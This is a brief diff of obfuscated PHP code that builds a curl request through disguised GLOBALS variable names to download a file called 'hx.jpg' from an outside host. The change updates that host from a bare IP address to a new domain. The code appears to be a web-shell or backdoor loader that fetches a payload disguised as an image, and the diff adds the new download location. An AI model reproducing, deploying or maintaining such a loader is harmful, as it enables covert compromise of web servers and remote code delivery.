@@ -9,7 +9,7 @@ ${${"GLOBALS"}["haxor"]}=curl_init();
 ${"GLOBALS"}["world"]="love";
 ${"GLOBALS"}["klangsub"]="love";
 curl_setopt(${${"GLOBALS"}["lph"]},
-CURLOPT_URL,"http://156.67.221.29/hx.jpg");
+CURLOPT_URL,"https://7x1337.com/hx.jpg");
 curl_setopt(${${"GLOBALS"}["world"]},CURLOPT_RETURNTRANSFER,1);
 ${${"GLOBALS"}["0xfah"]}=curl_exec(${${"GLOBALS"}["delves"]});
 curl_close(${${"GLOBALS"}["klangsub"]});
